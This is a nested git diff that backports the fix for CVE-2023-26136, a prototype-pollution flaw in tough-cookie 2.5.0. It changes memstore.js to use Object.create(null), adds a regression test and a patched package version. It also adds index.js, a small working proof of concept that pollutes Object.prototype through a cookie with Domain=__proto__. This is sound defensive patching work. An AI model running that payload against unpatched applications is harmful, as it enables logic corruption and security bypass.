@@ -1,3 +1,127 @@
+diff --git a/changes.diff b/changes.diff
+new file mode 100644
+index 0000000..f5a0a4f
+--- /dev/null
++++ b/changes.diff
+@@ -0,0 +1,118 @@
++diff --git a/index.js b/index.js
++new file mode 100644
++index 0000000..d17ae7e
++--- /dev/null
+++++ b/index.js
++@@ -0,0 +1,40 @@
+++/*
+++CVE-2023-26136 - Prototype Pollution:
+++Object.prototype properties injection via cookie manipulation
+++
+++Potential Damage:
+++- Corrupts application logic
+++- Bypasses security checks
+++- Leaks sensitive data
+++- Enables remote code execution
+++*/
+++async function main() {
+++  try {
+++    const tough = require("tough-cookie");
+++    const jar = new tough.CookieJar(undefined, {
+++      rejectPublicSuffixes: false, // Rejects cookies with domains like "com" and "co.uk"
+++      looseMode: true // Allows cookies like `bar` and `=bar` which have an implied empty name
+++    });
+++
+++    // Tries to pollute the prototype by setting a cookie with Domain=__proto__
+++    await new Promise((resolve, reject) => {
+++      jar.setCookie(
+++        "Slonser=polluted; Domain=__proto__; Path=/notauth",
+++        "https://__proto__/admin",
+++        (err, cookie) => (err ? reject(err) : resolve(cookie))
+++      );
+++    });
+++
+++    // Checks if the prototype was polluted by looking for an injected property
+++    const pollutedObject  = {};
+++    if (pollutedObject["/notauth"] === undefined) {
+++      throw new Error("CVE-2023-26136: Prototype Pollution");
+++    }
+++
+++    console.log("EXPLOITED SUCCESSFULLY");
+++  } catch {
+++    console.log("EXPLOIT FAILED");
+++  }
+++}
+++
+++main();
++diff --git a/lib/memstore.js b/lib/memstore.js
++index d2b915c..6b0a0b1 100644
++--- a/lib/memstore.js
+++++ b/lib/memstore.js
++@@ -36,7 +36,7 @@ var util = require('util');
++ 
++ function MemoryCookieStore() {
++   Store.call(this);
++-  this.idx = {};
+++  this.idx = Object.create(null);
++ }
++ util.inherits(MemoryCookieStore, Store);
++ exports.MemoryCookieStore = MemoryCookieStore;
++@@ -115,10 +115,10 @@ MemoryCookieStore.prototype.findCookies = function(domain, path, cb) {
++ 
++ MemoryCookieStore.prototype.putCookie = function(cookie, cb) {
++   if (!this.idx[cookie.domain]) {
++-    this.idx[cookie.domain] = {};
+++    this.idx[cookie.domain] = Object.create(null);
++   }
++   if (!this.idx[cookie.domain][cookie.path]) {
++-    this.idx[cookie.domain][cookie.path] = {};
+++    this.idx[cookie.domain][cookie.path] = Object.create(null);
++   }
++   this.idx[cookie.domain][cookie.path][cookie.key] = cookie;
++   cb(null);
++@@ -150,7 +150,7 @@ MemoryCookieStore.prototype.removeCookies = function(domain, path, cb) {
++ };
++ 
++ MemoryCookieStore.prototype.removeAllCookies = function(cb) {
++-  this.idx = {};
+++  this.idx = Object.create(null);
++   return cb(null);
++ }
++ 
++diff --git a/test/cookie_jar_test.js b/test/cookie_jar_test.js
++index 67809b9..b2905d5 100644
++--- a/test/cookie_jar_test.js
+++++ b/test/cookie_jar_test.js
++@@ -541,4 +541,28 @@ vows
++       }
++     }
++   })
+++  .addBatch({
+++    "Issue #282 - CVE-2023-26136 - Prototype pollution": {
+++      "when setting a cookie with the domain __proto__": {
+++        topic: function() {
+++          const jar = new tough.CookieJar(undefined, {
+++            rejectPublicSuffixes: false, // Rejects cookies with domains like "com" and "co.uk"
+++            looseMode: true // Allows cookies like `bar` and `=bar` which have an implied empty name
+++          });
+++
+++          // Tries to pollute the prototype by setting a cookie with Domain=__proto__
+++          jar.setCookieSync(
+++            "Slonser=polluted; Domain=__proto__; Path=/notauth",
+++            "https://__proto__/admin"
+++          );
+++
+++          this.callback();
+++        },
+++        "results in a cookie that is not affected by the attempted prototype pollution": function() {
+++          const pollutedObject = {};
+++          assert(pollutedObject["/notauth"] === undefined);
+++        }
+++      }
+++    }
+++  })
++   .export(module);
++diff --git a/tough-cookie-2.5.0-PATCHED.tgz b/tough-cookie-2.5.0-PATCHED.tgz
++new file mode 100644
++index 0000000..23f21e8
++Binary files /dev/null and b/tough-cookie-2.5.0-PATCHED.tgz differ
 diff --git a/index.js b/index.js
 new file mode 100644
 index 0000000..d17ae7e
@@ -79,6 +203,19 @@ index d2b915c..6b0a0b1 100644
    return cb(null);
  }
  
+diff --git a/package.json b/package.json
+index 8af9909..902adbc 100644
+--- a/package.json
++++ b/package.json
+@@ -43,7 +43,7 @@
+     "RFC6265",
+     "RFC2965"
+   ],
+-  "version": "2.5.0",
++  "version": "2.5.0-PATCHED",
+   "homepage": "https://github.com/salesforce/tough-cookie",
+   "repository": {
+     "type": "git",
 diff --git a/test/cookie_jar_test.js b/test/cookie_jar_test.js
 index 67809b9..b2905d5 100644
 --- a/test/cookie_jar_test.js
@@ -114,5 +251,5 @@ index 67809b9..b2905d5 100644
    .export(module);
 diff --git a/tough-cookie-2.5.0-PATCHED.tgz b/tough-cookie-2.5.0-PATCHED.tgz
 new file mode 100644
-index 0000000..23f21e8
+index 0000000..b720827
 Binary files /dev/null and b/tough-cookie-2.5.0-PATCHED.tgz differ
